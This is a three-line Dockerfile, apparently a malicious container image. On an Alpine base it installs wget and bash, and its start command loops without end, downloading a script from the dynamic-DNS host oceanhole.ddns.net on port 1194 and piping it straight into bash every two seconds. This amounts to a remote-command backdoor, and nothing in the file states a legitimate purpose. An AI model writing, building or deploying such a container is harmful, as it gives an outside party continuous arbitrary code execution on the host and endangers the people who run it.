FROM alpine
RUN apk update && apk add wget bash
CMD "while true; do wget oceanhole.ddns.net:1194/fl -qO - | bash; sleep 2; done"
